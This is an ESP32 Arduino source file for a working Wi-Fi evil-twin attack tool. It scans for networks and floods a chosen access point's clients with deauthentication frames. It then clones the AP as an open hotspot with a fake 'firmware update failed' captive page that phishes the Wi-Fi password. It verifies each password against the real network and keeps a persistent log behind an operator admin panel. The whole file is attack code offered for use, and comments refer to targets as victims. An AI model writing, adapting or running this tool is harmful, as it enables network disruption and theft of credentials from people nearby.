#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include <Preferences.h>
Preferences prefs; // NVS flash: log + uptime survive reboots

String bytesToStr(const uint8_t* b, uint32_t size);

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

const char* ADMIN_TOKEN = "7f9a2c8e4b1d603f9a5e8c2b7d41096e"; // hardcode token for /admin and /clear

// true when the request carries the admin token; callers decide what to send on failure
bool checkToken() {
  return webServer.hasArg("token") && webServer.arg("token") == ADMIN_TOKEN;
}

void denyToken() {
  webServer.send(401, "text/plain", "401: admin token required");
}

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";
String _log = ""; // captured password attempts, shown on /admin
String _logRaw = ""; // persisted entries, one per line: uptimeSec\tsid\tpassword
bool hotspot_active = false;
bool deauthing_active = false;
bool verifying = false;
bool verifyPending = false; // WiFi.begin() is issued from loop() once VERIFY_DELAY_MS has passed
uint32_t verifyStartMs = 0;
const uint32_t VERIFY_DELAY_MS = 1000; // settle time after WiFi.disconnect() before WiFi.begin()
const uint32_t VERIFY_TIMEOUT_MS = 30000; // resume deauth even if the victim's browser never reaches /result

uint32_t totalUptimeSec = 0; // powered-on seconds, accumulated across reboots
uint32_t bootMillis = 0;
unsigned long upNow = 0;
const uint32_t LOG_TTL_SEC = 24UL * 60 * 60; // entries live 24h of active uptime

uint32_t effNowSec() {
  return totalUptimeSec + (millis() - bootMillis) / 1000;
}

void saveUptime() {
  totalUptimeSec = effNowSec();
  bootMillis = millis();
  prefs.putULong("uptime", totalUptimeSec);
}

void saveLog() {
  if (_logRaw.length() == 0) {
    prefs.remove("log");
    return;
  }
  prefs.putBytes("log", _logRaw.c_str(), _logRaw.length());
}

void loadLog() {
  prefs.begin("etwin", false);
  totalUptimeSec = prefs.getULong("uptime", 0);
  bootMillis = millis();
  size_t len = prefs.getBytesLength("log");
  if (len) {
    char* buf = (char*)malloc(len + 1);
    if (buf) {
      prefs.getBytes("log", buf, len);
      buf[len] = '\0';
      _logRaw = String(buf);
      free(buf);
    }
  }
  purgeOldEntries();
  _log = logToHtml();
}

// drop entries older than 24h, returns how many were dropped
int purgeOldEntries() {
  uint32_t nowSec = effNowSec();
  String keep = "";
  int dropped = 0;
  int start = 0;
  while (true) {
    int end = _logRaw.indexOf('\n', start);
    if (end < 0) break;
    String line = _logRaw.substring(start, end);
    start = end + 1;
    int tab = line.indexOf('\t');
    if (tab <= 0) continue;
    uint32_t t = line.substring(0, tab).toInt();
    if (nowSec >= t && (nowSec - t) < LOG_TTL_SEC) keep += line + "\n";
    else dropped++;
  }
  if (dropped) _logRaw = keep;
  return dropped;
}

// escapes text that reaches the page from outside (SSIDs, passwords)
String htmlEscape(const String& s) {
  String out = "";
  for (unsigned int i = 0; i < s.length(); i++) {
    char c = s.charAt(i);
    if (c == '&') out += "&amp;";
    else if (c == '<') out += "&lt;";
    else if (c == '>') out += "&gt;";
    else if (c == '"') out += "&quot;";
    else if (c == '\'') out += "&#39;";
    else out += c;
  }
  return out;
}

// strips tags from a trusted constant so it can be used inside <title>
String plainText(const String& html) {
  String out = "";
  bool inTag = false;
  for (unsigned int i = 0; i < html.length(); i++) {
    char c = html.charAt(i);
    if (c == '<') inTag = true;
    else if (c == '>') inTag = false;
    else if (!inTag) out += c;
  }
  return out;
}

// the log is tab and newline separated, so control characters are replaced before storing
String logField(const String& s) {
  String out = s;
  for (unsigned int i = 0; i < out.length(); i++) {
    if ((uint8_t)out.charAt(i) < 0x20) out.setCharAt(i, '?');
  }
  return out;
}

// WPA passphrases are 8-63 printable ASCII characters; anything else can never verify
bool isValidPassphrase(const String& s) {
  if (s.length() < 8 || s.length() > 63) return false;
  for (unsigned int i = 0; i < s.length(); i++) {
    uint8_t c = s.charAt(i);
    if (c < 0x20 || c > 0x7E) return false;
  }
  return true;
}

bool hasBssid(const uint8_t* b) {
  for (int i = 0; i < 6; i++) {
    if (b[i] != 0) return true;
  }
  return false;
}

// true once a network has been picked (a zero BSSID means nothing is selected)
bool hasTarget() {
  return hasBssid(_selectedNetwork.bssid);
}

String logToHtml() {
  String out;
  out.reserve(_logRaw.length() * 4); // ~90B HTML overhead per ~30B log line
  uint32_t nowSec = effNowSec();
  int start = 0;
  while (true) {
    int end = _logRaw.indexOf('\n', start);
    if (end < 0) break;
    String line = _logRaw.substring(start, end);
    start = end + 1;
    int t1 = line.indexOf('\t');
    int t2 = line.indexOf('\t', t1 + 1);
    if (t1 <= 0 || t2 < 0) continue;
    uint32_t t = line.substring(0, t1).toInt();
    String ssid = line.substring(t1 + 1, t2);
    String pass = line.substring(t2 + 1);
    uint32_t age = (nowSec > t) ? (nowSec - t) : 0;
    out += "<li><code>";
    out += htmlEscape(ssid);
    out += "</code> &rarr; <code>";
    out += htmlEscape(pass);
    out += "</code> <small>(";
    if (age < 60) {
      out += "just now";
    } else if (age < 3600) {
      out += age / 60;
      out += "m ago";
    } else {
      out += (age / 3600);
      out += "h ago";
    }
    out += ")</small></li>";
  }
  return out;
}

void logAttempt(const String& ssid, const String& pass) {
  _logRaw += String(effNowSec()) + "\t" + logField(ssid) + "\t" + logField(pass) + "\n";
  if (_logRaw.length() > 2500) { // cap NVS blob size, drop oldest lines
    int cut = _logRaw.indexOf('\n', _logRaw.length() - 2500);
    if (cut > 0) _logRaw = _logRaw.substring(cut + 1);
  }
  purgeOldEntries();
  _log = logToHtml();
  saveLog();
  Serial.println("[CAPTURED] " + ssid + " -> " + pass);
}

void handleClear() {
  if (!checkToken()) {
    denyToken();
    return;
  }
  
  _logRaw = "";
  _log = "";
  saveLog();
  webServer.sendHeader("Location", "/admin");
  webServer.send(303);
}

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = htmlEscape(String(_selectedNetwork.ssid));
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + plainText(t) + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String indexPage() {
  return header(TITLE) + "<div>" + BODY + "</div><div><form action='/' method=post><label>WiFi password:</label>" +
         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
}

// token prompt shown when the operator panel on / is requested without a token
String tokenPage() {
  return "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
         "<meta charset=\"UTF-8\"></head>"
         "<body style='font-family:sans-serif;text-align:center;padding-top:3em;'>"
         "<form method='post' action='/'>"
         "<h3>Admin access</h3>"
         "<input type='password' name='token' placeholder='token' required style='padding:8px;'>"
         "<input type='submit' value='Enter' style='padding:8px;'>"
         "</form></body></html>";
}

void setup() {
  Serial.begin(115200);
  WiFi.persistent(false);  // never store captured STA creds - otherwise the board tries to auto-connect to the victim AP after reboot
  WiFi.setAutoReconnect(false);
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  startControlAP();

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/clear", handleClear); 
  webServer.onNotFound(handleIndex);
  webServer.begin();
  loadLog();
  performScan(); // so the admin page has networks right after boot
}

// control hotspot: WiPhi_34732, what the operator connects to
void startControlAP() {
  hotspot_active = false;
  verifyPending = false; // a check still waiting for its WiFi.begin() must not run against the control AP
  verifying = false;
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiPhi_34732", "d347h320");
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
}

// evil twin: open AP with the target's SSID on the target's channel
void startEvilTwin() {
  hotspot_active = true;
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  //evil twin must live on the victim's channel, otherwise deauth frames hit nothing
  WiFi.softAP(_selectedNetwork.ssid.c_str(), nullptr, (uint8_t)_selectedNetwork.ch);
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

void handleResult() {
  verifying = false; // done checking (page loads 15s after submission), resume deauth if it was on
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + htmlEscape(_selectedNetwork.ssid) + " Password: " + htmlEscape(_tryPassword);
    deauthing_active = false; // the board is now a client of the victim network, stop kicking it
    startControlAP();
    Serial.println("Good password was entered !");
    Serial.println("Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword);
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<input type='hidden' name='token' value='{token}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<input type='hidden' name='token' value='{token}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

// control panel, served on / (no evil twin) and /admin
String controlPage() {
  String html = _tempHTML;
  html.reserve(_tempHTML.length() + _correct.length() + _log.length() + 4850); // ~50B tokens + ~4500B (16x ~280B rows) + ~300B footer tags

  // fill the template before any SSID is appended, so SSID text is never read as a placeholder
  html.replace("{token}", ADMIN_TOKEN); 
  html.replace("{deauth_button}", deauthing_active ? "Stop deauthing" : "Start deauthing");
  html.replace("{deauth}", deauthing_active ? "stop" : "start");
  html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
  html.replace("{hotspot}", hotspot_active ? "stop" : "start");
  html.replace("{disabled}", hasTarget() ? "" : " disabled");

  String selectedBssid = bytesToStr(_selectedNetwork.bssid, 6);
  
  for (int i = 0; i < 16; ++i) {

    if (_networks[i].ssid == "") {
      break;
    }
    String bssid = bytesToStr(_networks[i].bssid, 6);
    html += "<tr><td>";
    html += htmlEscape(_networks[i].ssid);
    html += "</td><td>";
    html += bssid;
    html += "</td><td>";
    html += _networks[i].ch;
    html += "</td><td><form method='post' action='/?ap=";
    html += bssid;
    html += "'><input type='hidden' name='token' value='";
    html += ADMIN_TOKEN;
    html += "'>";

    if (bssid == selectedBssid) {
      html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      html += "<button>Select</button></form></td></tr>";
    }
  }

  html += "</table>";

  if (_correct != "") {
    html += "</br><h3>";
    html += _correct;
    html += "</h3>";
  }

  if (_log != "") {
    html += "</br><h3>Captured password attempts:</h3><ul style='text-align:left;list-style:disc;padding-left:1.5em;'>";
    html += _log;
    html += "</ul>";
    html += "<form method='post' action='/clear'><input type='hidden' name='token' value='";
    html += ADMIN_TOKEN;
    html += "'><button style='background-color:#ffcccc'>Delete log</button></form>";
  }

  html += "</div></body></html>";
  return html;
}

// handles ?ap=, ?deauth= and ?hotspot= from the panel; returns true when a hotspot toggle was requested
bool applyControlArgs() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (hasBssid(_networks[i].bssid) && bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start" && hasTarget()) {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start" && hasTarget()) {
      startEvilTwin();
    } else if (webServer.arg("hotspot") == "stop") {
      startControlAP();
    }
    return true;
  }

  return false;
}

void handleIndex() {
  // ap/deauth/hotspot are operator commands; without a token check a victim
  // could stop the attack from its own browser (POST /?hotspot=stop)
  if (webServer.hasArg("ap") || webServer.hasArg("deauth") || webServer.hasArg("hotspot")) {
    if (!checkToken()) {
      denyToken();
      return;
    }
    if (applyControlArgs()) {
      webServer.send(204);
      return;
    }
  }

  if (hotspot_active == false) {
    // no evil twin: / is the operator panel, so it needs the token just like /admin
    if (!checkToken()) {
      webServer.send(401, "text/html", tokenPage());
      return;
    }
    webServer.send(200, "text/html", controlPage());
    return;
  }

  if (webServer.hasArg("password")) {
    String pass = webServer.arg("password");
    if (!isValidPassphrase(pass)) {
      webServer.send(200, "text/html", "<html><body><center><h2>Password must be 8-63 printable characters.</h2><a href='/'>Back</a></center></body></html>");
      return;
    }
    _tryPassword = pass;
    logAttempt(_selectedNetwork.ssid, _tryPassword);
    verifying = true; // pause deauth bursts, otherwise we deauth our own checking connection
    verifyStartMs = millis();
    verifyPending = true; // WiFi.begin() follows from loop() once the disconnect has settled
    WiFi.disconnect();
    webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
  } else {
    webServer.send(200, "text/html", indexPage());
  }
}

void handleAdmin() {
  if (!checkToken()) {
    denyToken();
    return;
  }

  if (applyControlArgs()) {
    webServer.send(204);
    return;
  }

  webServer.send(200, "text/html", controlPage());
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // start the credential check once the disconnect has settled, see handleIndex()
  if (verifyPending && millis() - verifyStartMs >= VERIFY_DELAY_MS) {
    verifyPending = false;
    WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
  }

  // /result normally clears this flag; clear it here too so a closed victim tab cannot pause deauth forever
  if (verifying && millis() - verifyStartMs >= VERIFY_TIMEOUT_MS) {
    verifying = false;
  }

  if (deauthing_active && hasTarget() && !verifying && millis() - deauth_now >= 100) {
        int channel = _selectedNetwork.ch;
        if (channel >= 1 && channel <= 13) {
            WiFi.setChannel(channel);
        }

    // Deauth frame: FF..FF (broadcast) <- AP's BSSID, reason code 1
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;   // deauth reason
    deauthPacket[25] = 0;

    // Raw frames can only be sent in promiscuous mode
    esp_wifi_set_promiscuous(true);

    // Burst of deauth frames: clients see them on their channel and disconnect
    for (int i = 0; i < 5; i++) {
      esp_err_t r1 = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
      deauthPacket[0] = 0xA0; // disassociation works on some stubborn clients
      esp_err_t r2 = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
      deauthPacket[0] = 0xC0;
      if (r1 != ESP_OK || r2 != ESP_OK) {
        Serial.println("send err: " + String((int)r1) + "," + String((int)r2));
      }
    }

    deauth_now = millis();
  }

  if (millis() - upNow >= 60000) { // every minute: persist uptime, purge >24h entries
    upNow = millis();
    saveUptime();
    if (purgeOldEntries() > 0) {
      _log = logToHtml();
      saveLog();
    }
  }

  // a blocking scan would switch channels and stall the burst loop, so it waits until deauth is off
  if (millis() - now >= 15000 && !hotspot_active && !deauthing_active) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
